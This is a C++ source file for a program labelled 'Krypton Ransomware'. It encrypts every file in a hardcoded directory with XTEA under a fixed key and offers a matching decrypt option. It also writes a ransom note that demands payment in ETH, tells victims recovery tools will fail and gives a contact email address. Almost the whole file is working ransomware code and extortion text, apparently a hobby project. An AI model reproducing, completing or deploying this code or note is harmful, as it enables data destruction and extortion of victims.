#include <iostream>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <algorithm>
#include "header.hpp"

#define BLOCK_SIZE 8

auto main() -> int {
    unsigned int key[4] = { 0xFACE, 0xDEAD, 0xBABE, 0xD00D };
    std::string path = "/home/draco/TobeEncrypted";
    auto write = std::fstream("/home/draco/TobeEncrypted/README.txt", std::ios::out | std::ios::trunc);
    auto message = std::string("No English? Use -> https://translate.google.com/\n\n"
                                  "What happened to your files?\n"
                                  "All of your files were protected with XTEA (an encryption algorithm)\n"
                                  "More info about XTEA can be found here -> https://en.wikipedia.org/wiki/XTEA\n\n"
                                  "How did this happen?\n"
                                  "Specially, your PC was generated personal and private key.\n"
                                  "All your files has been encrypted with the public key\n"
                                  "Decryption of your files is only possible with the help of the private key,\n"
                                  "and the special decrypt program, which is on our secret server\n\n"
                                  "What should I do?\n"
                                  "So, there are two ways you can choose -> wait for a miracle and double your ransom price,\n"
                                  "or start learning how to obtain and use ETH(etherium).\n"
                                  "If you have really valuable data, you better not waste your time,\n"
                                  "Because there is no other way to get your files back, except from paying the ransom\n"
                                  "Photorec, Rannoh Decryptor, and repair tools are useless and will destroy your data\n"
                                  "Don't be a moron\n\n"
                                  "For more specific instructions\n\n"
                                  "Contact info -> ramizna@code.edu.az\n"
                                  "For proofing, send two of the encrypted files to the email and\n"
                                  "I will decrypt it and send it back. Do not send any backup or valuable info.\n"
                                  "I won't decrypt those things.");

    bool main_loop = true;
    int user_input;

    while (main_loop) {
        main_menu();
        std::cout << "\n> ";
        std::cin >> user_input;

        switch (user_input) {
            case 1:
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    std::fstream file(entry.path(), std::ios::in | std::ios::out | std::ios::binary);

                    //Check if file is correctly opened
                    if (std::filesystem::is_directory(entry.path())) {
                        std::cout << "Opening file: " << entry.path().stem().string() << std::endl;
                        std::filesystem::directory_iterator files(entry.path());
                        entry.path().string();
                    }

                    else if (!std::filesystem::is_directory(entry.path())) {
                        std::cout << "Opened File " << entry.path().stem().string() << std::endl;
                        file.seekg(0, std::ios::end);
                        unsigned file_size = file.tellg(); //Get file size
                        std::cout << "File size: " << file_size << " bytes" << std::endl;
                        file.seekg(std::ios::beg);
                        file.clear();

                        //Calculate number of blocks to be encrypted/decrypted
                        auto block_number = file_size / BLOCK_SIZE;
                        if (file_size % BLOCK_SIZE != 0) { ++block_number; }
                        std::cout << "Number of blocks: " << block_number << std::endl;

                        //Declare data array for file operations
                        unsigned char data_array[BLOCK_SIZE];
                        unsigned file_position = file.tellg();

                        std::cout << "Starting encryption..." << std::endl;
                        for (int i = 0; i < block_number; i++) {
                            //Get data from file
                            file.seekg(file_position);
                            file.read((char*)data_array, BLOCK_SIZE);

                            //Encrypt
                            Encryptor::encryptor(32, (uint32_t *) data_array, key);

                            //Write to file
                            file.seekp(file_position);
                            file.write((char*)data_array, BLOCK_SIZE);

                            //Zero out the data array and increase the pos counter
                            memset(data_array, 0, BLOCK_SIZE);
                            file_position += BLOCK_SIZE;
                        }

                        //Close file
                        file.close();
                        std::cout << "Closing file\n" << std::endl;
                    }
                }
                write << message << std::endl;
                break;

            case 2:
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    std::fstream file(entry.path(), std::ios::in | std::ios::out | std::ios::binary);

                    //Check if file is correctly opened
                    if (std::filesystem::is_directory(entry.path())) {
                        std::cout << "Opening file: " << entry.path().stem().string() << std::endl;
                        std::filesystem::directory_iterator files(entry.path());
                        entry.path().string();
                    }

                    else if (!std::filesystem::is_directory(entry.path())) {
                        std::cout << "Opened File " << entry.path().stem().string() << std::endl;
                        file.seekg(0, std::ios::end);
                        unsigned file_size = file.tellg(); //Get file size
                        std::cout << "File size: " << file_size << " bytes" << std::endl;
                        file.seekg(std::ios::beg);
                        file.clear();

                        //Calculate number of blocks to be encrypted/decrypted
                        auto block_number = file_size / BLOCK_SIZE;
                        if (file_size % BLOCK_SIZE != 0) { ++block_number; }
                        std::cout << "Number of blocks: " << block_number << std::endl;

                        //Declare data array for file operations
                        unsigned char data_array[BLOCK_SIZE];
                        unsigned file_position = file.tellg();

                        std::cout << "Starting decryption..." << std::endl;
                        for (int i = 0; i < block_number; i++) {
                            //Get data from file
                            file.seekg(file_position);
                            file.read((char*)data_array, BLOCK_SIZE);

                            //Encrypt
                            Decryptor::decryptor(32, (uint32_t *) data_array, key);

                            //Write to file
                            file.seekp(file_position);
                            file.write((char*)data_array, BLOCK_SIZE);

                            //Zero out the data array and increase the pos counter
                            memset(data_array, 0, BLOCK_SIZE);
                            file_position += BLOCK_SIZE;
                        }

                        //Close file
                        file.close();
                        std::cout << "Closing file" << std::endl;
                    }
                }
                break;

            case 0:
                main_loop = false;
                break;

            default:
                std::cout << "[-] Invalid command, Please try again" << std::endl;
        }
    }
}

auto main_menu() -> void {
    std::cout << "==================================================|\n";
    std::cout << "               Krypton Ransomware                 |\n";
    std::cout << "==================================================|\n";
    std::cout << "[1] Encrypt                                       |\n";
    std::cout << "[2] Decrypt                                       |\n";
    std::cout << "[0] Exit                                          |\n";
    std::cout << "==================================================|\n";
}
